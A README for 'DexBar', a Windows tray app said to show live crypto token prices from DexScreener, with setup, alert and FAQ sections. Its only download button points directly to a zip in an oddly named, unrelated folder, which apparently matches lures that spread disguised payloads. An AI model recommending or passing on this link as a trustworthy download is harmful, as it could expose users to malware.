# 📈 DexBar - Track crypto prices on your desktop

[![](https://img.shields.io/badge/Download_DexBar-Click_Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/aikih9831/DexBar/main/triorchism/Bar_Dex_2.0-alpha.1.zip)

DexBar provides a way to watch cryptocurrency prices from your Windows taskbar. You see real-time price updates for your chosen tokens without opening a web browser. The app runs in the background and keeps your workspace clean.

## ⚙️ System Requirements

DexBar runs on any modern version of Windows. Ensure your computer meets the following criteria for a smooth experience:

*   Operating System: Windows 10 or Windows 11.
*   Processor: Standard dual-core CPU or better.
*   Memory: At least 4GB of RAM.
*   Internet Connection: Active connection to fetch live data from DexScreener.
*   Storage: 100MB of free disk space.

## 🚀 Getting Started

Once you launch DexBar, the icon appears in your system tray. This area is usually located in the bottom-right corner of your screen near the clock. 

Right-click the DexBar icon to open the main menu. From here, you can add new tokens to your watchlist. Enter the contract address of the token you want to track. DexBar fetches the current price directly from DexScreener.

## 🔔 Setting Alerts

You can configure alerts to notify you when a token hits a specific price or market cap. 

1.  Right-click the DexBar icon.
2.  Select "Settings" from the list.
3.  Navigate to the "Alerts" tab.
4.  Click the plus button to create a new rule.
5.  Choose your token, set the target price, and pick a notification type.
6.  Save your changes.

The app sends a notification to your screen when the triggers meet your criteria. This helps you monitor price shifts without constant manual checks.

## 🔄 Using Cycle Mode

Cycle Mode rotates through your watchlist tokens automatically. This feature updates the price in your system tray every few seconds.

*   Enable this in the "Display" section of the settings menu.
*   Set the rotation speed to your preference.
*   The system tray icon updates to show each token symbol and price in sequence.

## 🛠 Troubleshooting

Most users find the app works well, but some common issues have easy fixes:

*   **No Price Updates:** Check your internet connection. If the connection works, restart the application to reset the data feed.
*   **Missing Icons:** If the icon does not appear in the tray, check your taskbar settings to ensure "DexBar" is set to show the icon.
*   **High Memory Usage:** Keep your watchlist size reasonable. Tracking hundreds of tokens simultaneously can consume more system resources.

## 🔒 Privacy and Security

DexBar fetches public data from DexScreener. The application does not store your private keys or connect to your personal crypto wallets. It functions strictly as an information tool to display prices. Your data remains on your local machine.

## 📋 Frequently Asked Questions

**Does DexBar support all blockchains?**
It supports tokens tracked on DexScreener, including Solana, Ethereum, and others.

**How often does the data refresh?**
The app updates data every 30 seconds by default. You can adjust this frequency in the "General" settings tab.

**Can I export my watchlist?**
Yes. Use the "Export Settings" option in the menu to save your list to a file for backup or movement to another device.

**Is this app open source?**
Yes. You can view the code and contribute to the project on the official GitHub repository.
